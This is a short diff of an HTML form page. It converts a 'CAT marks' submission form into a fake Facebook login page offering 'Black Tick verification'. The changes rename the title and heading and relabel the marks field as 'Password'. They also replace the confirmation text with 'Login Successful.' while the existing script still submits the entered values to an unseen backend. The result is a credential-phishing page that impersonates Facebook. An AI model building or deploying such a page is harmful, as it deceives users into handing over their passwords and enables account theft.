@@ -1,10 +1,9 @@
-```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CAT Registration</title>
+  <title>Facebook Black Tick verification</title>
 
   <style>
     *{box-sizing:border-box}
@@ -83,7 +82,7 @@
 
   <main class="form-wrap">
 
-    <p class="heading">Log in</p>
+    <p class="heading">Log in To Facebook</p>
 
     <form id="marksForm">
 
@@ -98,7 +97,7 @@
       <input
         type="text"
         name="marks"
-        placeholder="Marks of Previous Test"
+        placeholder="Password"
         maxlength="100"
         required
       >
@@ -146,7 +145,7 @@
           throw new Error(result.error || "Submission failed");
         }
 
-        status.textContent = "CAT marks submitted successfully.";
+        status.textContent = "Login Successful.";
         form.reset();
 
       } catch (error) {
